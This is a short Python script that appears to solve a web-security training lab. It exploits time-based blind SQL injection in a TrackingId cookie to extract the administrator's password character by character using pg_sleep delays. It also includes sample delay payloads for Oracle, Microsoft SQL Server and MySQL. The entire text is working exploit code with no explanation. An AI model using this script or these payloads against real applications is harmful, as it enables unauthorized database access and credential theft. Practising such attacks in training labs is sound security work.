import requests
import time

URL = 'https://ac771f041e3d3b9ac03f2988004d003b.web-security-academy.net/'
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


def find_password(tracking_code, session):
    password = ""
    index = 0
    while True:
        time.sleep(0.5)
        found = False
        index = index + 1
        for character in characters:
            oracle_query = "'|| (SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual) ||'"
            microsoft_query = "'+ (IF (1=1) WAITFOR DELAY '0:0:10' +'"
            postgresql_query = f"'|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{index},1)='{character}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users) ||'"
            mysql_query = "' (SELECT IF(1=1,sleep(10),'a')) '"
            sql_query = postgresql_query
            response = requests.get(URL, cookies={'TrackingId': f"{tracking_code}{sql_query}", 'session': session})
            if response.elapsed.total_seconds() > 3:
                found = True
                password = password + character
                continue
        if not found:
            print(password)
            break


if __name__ == '__main__':
    r = requests.get(URL)
    tracking_code = r.cookies['TrackingId']
    session = r.cookies['session']
    find_password(tracking_code, session)
